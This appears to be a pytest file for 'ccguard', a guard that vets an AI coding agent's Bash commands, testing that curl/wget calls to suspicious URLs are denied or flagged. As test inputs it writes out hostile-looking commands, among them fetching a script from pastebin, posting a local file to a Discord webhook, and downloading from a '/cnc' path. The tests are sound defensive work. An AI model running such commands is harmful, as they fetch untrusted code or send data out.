"""Bash-уровень: curl/wget с подозрительными URL должны блокироваться
тем же каталогом, что и WebFetch (не только PostToolUse audit).
"""
from __future__ import annotations

from datetime import UTC, datetime

import pytest

from ccguard.agent.enforce import decide
from ccguard.schemas import EnforceHookInput, Policy, PolicyMeta


def _bash(cmd: str) -> EnforceHookInput:
    return EnforceHookInput(
        hook_event_name="PreToolUse", tool_name="Bash", tool_input={"command": cmd}
    )


def _policy() -> Policy:
    return Policy(
        meta=PolicyMeta(revision=1, updated_at=datetime.now(UTC)),
        enforcement_mode="enforce",
    )


def test_curl_pastebin_download_is_blocked() -> None:
    # NB: это download, не upload — dangerous-rule exfil/upload-pastebin
    # тоже ловит pastebin в curl, но не различает direction. Главное —
    # команда не должна пройти.
    p = _policy()
    d = decide(_bash("curl https://pastebin.com/raw/abc -o /tmp/x.sh"), p)
    assert d.permission == "deny"
    assert d.rule_id is not None
    assert d.rule_id.startswith("network.suspicious.") or d.rule_id.startswith("dangerous.")


def test_curl_github_api_allowed() -> None:
    p = _policy()
    d = decide(_bash("curl https://api.github.com/repos/x/y"), p)
    assert d.permission == "allow"


def test_wget_private_ip_warns_not_blocks() -> None:
    p = _policy()
    d = decide(_bash("wget http://10.0.0.5/cnc -O /tmp/x"), p)
    # private-ip — severity=warn, не блок
    assert d.permission == "allow"
    assert any("private-ip" in s for s in d.warning_signals), d.warning_signals


def test_curl_discord_webhook_blocked() -> None:
    p = _policy()
    d = decide(_bash("curl -X POST https://discord.com/api/webhooks/123/abc -d @x"), p)
    assert d.permission == "deny"
    # либо suspicious, либо dangerous
    assert d.rule_id is not None


def test_curl_ip_as_host_warns() -> None:
    p = _policy()
    d = decide(_bash("curl http://1.2.3.4/script.sh -o /tmp/x"), p)
    # IP-as-host — warn, и /tmp/x не должно зацепить rm/etc.
    assert d.permission == "allow"
    assert any("ip-as-host" in s for s in d.warning_signals), d.warning_signals


def test_normal_bash_no_signals() -> None:
    p = _policy()
    d = decide(_bash("ls -la /tmp"), p)
    assert d.permission == "allow"
    assert d.warning_signals == []
